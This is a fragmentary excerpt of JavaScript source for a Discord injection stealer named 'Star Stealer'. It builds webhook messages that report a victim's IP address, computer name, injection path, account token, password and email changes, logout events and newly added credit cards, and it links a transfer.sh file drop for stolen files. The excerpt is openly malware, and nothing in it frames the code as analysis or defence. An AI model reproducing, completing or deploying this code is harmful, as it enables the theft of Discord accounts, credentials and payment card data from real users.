...
const makeEmbed = async ({
    ...
    var params = {
        username: "Star Stealer",
        avatar_url: "https://raw.githubusercontent.com/JunkieOpfer/star/main/img/IMG_9927.jpg",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: `�[${config.creator}] | https://github.com/JunkieOpfer/`
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Star")){
        try{
        fs.rmdirSync(__dirname + "/Star")
        }catch(err){
            console.log(err)
        }
    var ip = await getIP()
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "Star Stealer Initialized",
            fields: [{
                name: "Injection Info",
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/JunkieOpfer/star/main/img/IMG_9927.jpg"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/JunkieOpfer/star/main/img/banner.jpg"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Star Stealer <a:mavikirmizi:853238372591599617>](https://github.com/JunkieOpfer/star)`,
                inline: !0
            }, {
                name: "Star Files",
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Star User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Star Stealer Victim got logged out",
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Star Stealer Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Star Stealer Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            case request.url.endsWith("tokens"):
                ...
                var params = await makeEmbed({
                    title: "Star Stealer User Credit Card Added",
                    color: config['embed-color'],
                    fields: [
                      { name: "Star Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                      { name: "IP", value: ip },
